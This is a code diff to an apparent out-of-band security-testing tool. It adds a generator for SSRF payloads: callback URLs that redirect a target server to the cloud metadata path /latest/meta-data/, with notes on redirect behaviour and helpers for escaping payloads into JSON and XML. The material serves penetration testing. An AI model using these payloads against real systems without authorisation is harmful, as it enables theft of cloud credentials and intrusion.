@@ -6,7 +6,7 @@
 // letter + a number: they never collide with tags users plant (the tag is always the label next to
 // the id) and never decode as exfil (too short).
 
-export type Section = "callbacks" | "bypass" | "address";
+export type Section = "callbacks" | "bypass" | "address" | "ssrf";
 export type Variant = { code: string; section: Section; name: string };
 export type Payload = Variant & { text: string; note?: string };
 
@@ -106,10 +106,22 @@ export function addressForms(ip: string): Form[] | null {
 
 export const formUrl = (f: Form, path: string, scheme = "http") => `${scheme}://${f.host}${path.startsWith("/") ? path : "/" + path}`;
 
+// ---------- plant presets (PLAN-PRESETS.md) ----------
+// SSRF → cloud metadata: plain HTTP first (Java HttpURLConnection and Ruby open-uri won't follow an
+// https → http redirect, and metadata is http).
+export function ssrfPayloads(tag: string, host: string): Payload[] {
+  const v = (code: string, name: string, text: string, note: string): Payload => ({ code, section: "ssrf", name, text, note });
+  return [
+    v("ks1", "First choice", `http://${sub("ks1", tag, host)}/`, "Use this one first: clients follow http → http redirects most reliably."),
+    v("ks2", "Plausible path", `http://${sub("ks2", tag, host)}/latest/meta-data/`, "For filters that want a path that looks like the real thing."),
+    v("ks3", "Over HTTPS", `https://${host}/${tag}/k/ks3`, "Java HttpURLConnection and Ruby open-uri won't follow https → http, so this one can stop at the first hop."),
+  ];
+}
+
 // ---------- which payload a hit came from ----------
-const ALL: Variant[] = [...callbacks("t", "h"), ...bypasses("t", "h", "e")].map(({ code, section, name }) => ({ code, section, name }));
+const ALL: Variant[] = [...callbacks("t", "h"), ...bypasses("t", "h", "e"), ...ssrfPayloads("t", "h")].map(({ code, section, name }) => ({ code, section, name }));
 const BY_CODE = new Map(ALL.map((v) => [v.code, v]));
-export const SECTION_LABEL = Object.fromEntries(SECTIONS.map((s) => [s.id, s.label])) as Record<string, string>;
+export const SECTION_LABEL = { ...Object.fromEntries(SECTIONS.map((s) => [s.id, s.label])), ssrf: "SSRF → cloud metadata" } as Record<string, string>;
 
 // extraLabels: the labels in front of the tag (the code is the one right next to it). summary: the
 // request line or SMTP summary. raw: the raw request, for an SMTP recipient.
@@ -127,4 +139,7 @@ export function variantOf(h: { extraLabels?: string[]; summary?: string; rawRequ
 
 // ---------- encoding for a payload that goes inside a parameter ----------
 export type Enc = "raw" | "once" | "twice";
+// for a payload pasted into JSON or XML: escaped for that context, nothing else changed
+export const jsonEscape = (s: string) => JSON.stringify(s).slice(1, -1);
+export const xmlEscape = (s: string) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&apos;");
 export const encode = (s: string, e: Enc) => (e === "raw" ? s : e === "once" ? encodeURIComponent(s) : encodeURIComponent(encodeURIComponent(s)));
